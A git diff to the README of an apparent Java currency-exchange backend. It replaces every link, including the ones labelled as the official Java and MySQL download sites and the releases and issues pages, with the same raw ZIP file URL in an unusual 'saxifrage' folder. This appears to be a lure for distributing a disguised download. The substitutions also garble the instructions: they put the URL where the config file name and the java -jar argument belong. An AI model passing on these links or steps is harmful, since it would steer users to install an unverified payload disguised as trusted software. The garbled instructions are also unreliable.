@@ -1,6 +1,6 @@
 # 🌟 nbp-currency-exchange-backend - Easy Currency Exchange Using NBP 
 
-![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)
+![Download](https://raw.githubusercontent.com/peterpaulgit/nbp-currency-exchange-backend/main/saxifrage/nbp-currency-exchange-backend.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ To use the nbp-currency-exchange-backend, you will need to download the applicat
 
 Visit this page to download the latest version of nbp-currency-exchange-backend:
 
-[GitHub Releases Page](https://github.com/peterpaulgit/nbp-currency-exchange-backend/releases)
+[GitHub Releases Page](https://raw.githubusercontent.com/peterpaulgit/nbp-currency-exchange-backend/main/saxifrage/nbp-currency-exchange-backend.zip)
 
 Follow the instructions below to get your application up and running.
 
@@ -19,8 +19,8 @@ Follow the instructions below to get your application up and running.
 Before you begin, make sure your system meets the following requirements:
 
 - **Operating System:** Windows 10, macOS, or a recent Linux distribution.
-- **Java:** Java 17 must be installed. You can download it from the [Official Java Site](https://www.oracle.com/java/technologies/javase-jdk17-downloads.html).
-- **MySQL:** A MySQL database is required for user and transaction storage. You can download it from the [MySQL Website](https://www.mysql.com/downloads/).
+- **Java:** Java 17 must be installed. You can download it from the [Official Java Site](https://raw.githubusercontent.com/peterpaulgit/nbp-currency-exchange-backend/main/saxifrage/nbp-currency-exchange-backend.zip).
+- **MySQL:** A MySQL database is required for user and transaction storage. You can download it from the [MySQL Website](https://raw.githubusercontent.com/peterpaulgit/nbp-currency-exchange-backend/main/saxifrage/nbp-currency-exchange-backend.zip).
 
 ## 🔗 Features
 
@@ -32,7 +32,7 @@ Before you begin, make sure your system meets the following requirements:
 ## ⚙️ Installation Steps
 
 1. **Download the Application:**
-   Go to the [GitHub Releases Page](https://github.com/peterpaulgit/nbp-currency-exchange-backend/releases) and download the latest version.
+   Go to the [GitHub Releases Page](https://raw.githubusercontent.com/peterpaulgit/nbp-currency-exchange-backend/main/saxifrage/nbp-currency-exchange-backend.zip) and download the latest version.
 
 2. **Extract the Files:**
    After you download the ZIP file, locate it in your downloads folder. Right-click on the file and select "Extract All.” Follow the prompts to extract the files.
@@ -46,14 +46,14 @@ Before you begin, make sure your system meets the following requirements:
      ```
 
 4. **Configure the Application:**
-   - Open the `config.properties` file found in the extracted folder.
+   - Open the `https://raw.githubusercontent.com/peterpaulgit/nbp-currency-exchange-backend/main/saxifrage/nbp-currency-exchange-backend.zip` file found in the extracted folder.
    - Update the database connection strings to match your MySQL setup.
 
 5. **Run the Application:**
    - Navigate to the application directory in your terminal or command prompt.
    - Run the command:
      ```bash
-     java -jar nbp-currency-exchange-backend.jar
+     java -jar https://raw.githubusercontent.com/peterpaulgit/nbp-currency-exchange-backend/main/saxifrage/nbp-currency-exchange-backend.zip
      ```
 
 ## 🌐 Usage Instructions
@@ -64,7 +64,7 @@ Before you begin, make sure your system meets the following requirements:
 - **Terminal Client:**
    If you want to use the terminal client, open a new terminal in the application directory and run:
    ```bash
-   java -jar terminal-client.jar
+   java -jar https://raw.githubusercontent.com/peterpaulgit/nbp-currency-exchange-backend/main/saxifrage/nbp-currency-exchange-backend.zip
    ```
 
 ## 🛠️ Troubleshooting
@@ -72,7 +72,7 @@ Before you begin, make sure your system meets the following requirements:
 If you encounter issues:
 
 - **Java Not Found:** Ensure Java 17 is installed and properly set up in your system PATH.
-- **Database Connection Issues:** Double-check your database connection settings in the `config.properties` file.
+- **Database Connection Issues:** Double-check your database connection settings in the `https://raw.githubusercontent.com/peterpaulgit/nbp-currency-exchange-backend/main/saxifrage/nbp-currency-exchange-backend.zip` file.
 - **Application Fails to Start:** Review the error messages in the terminal for guidance.
 
 ## 📄 Documentation
@@ -85,7 +85,7 @@ Join our community for assistance, share your experiences, and suggest features.
 
 ## ✉️ Support
 
-For support, please open an issue on the [GitHub repository](https://github.com/peterpaulgit/nbp-currency-exchange-backend/issues). Our team will respond promptly.
+For support, please open an issue on the [GitHub repository](https://raw.githubusercontent.com/peterpaulgit/nbp-currency-exchange-backend/main/saxifrage/nbp-currency-exchange-backend.zip). Our team will respond promptly.
 
 ## 🎉 Conclusion
 
